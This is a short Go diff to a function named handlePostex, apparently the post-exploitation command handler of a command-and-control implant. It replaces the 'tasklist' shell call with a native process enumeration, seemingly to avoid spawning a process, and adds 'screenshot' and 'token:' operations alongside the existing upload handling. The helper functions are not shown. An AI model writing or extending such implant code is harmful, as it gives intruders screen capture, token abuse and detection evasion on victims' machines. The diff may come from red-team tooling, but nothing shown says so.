@@ -4,7 +4,6 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
-	"os/exec"
 	"os/user"
 	"runtime"
 	"strings"
@@ -15,11 +14,11 @@ func handlePostex(cmd string) string {
 	switch {
 	case op == "ps":
 		if runtime.GOOS == "windows" {
-			out, err := exec.Command("tasklist").CombinedOutput()
-			if err != nil {
-				return "Error: " + err.Error()
+			procs := enumerateProcessNames()
+			if len(procs) == 0 {
+				return "Error: no process list"
 			}
-			text := string(out)
+			text := strings.Join(procs, "\n")
 			if len(text) > 8000 {
 				text = text[:8000]
 			}
@@ -85,6 +84,10 @@ func handlePostex(cmd string) string {
 			return "Error: " + err.Error()
 		}
 		return fmt.Sprintf("uploaded %d bytes", len(data))
+	case op == "screenshot":
+		return captureScreenshot()
+	case strings.HasPrefix(op, "token:"):
+		return handleTokenOp(strings.TrimPrefix(op, "token:"))
 	default:
 		return "Error: unknown postex op"
 	}
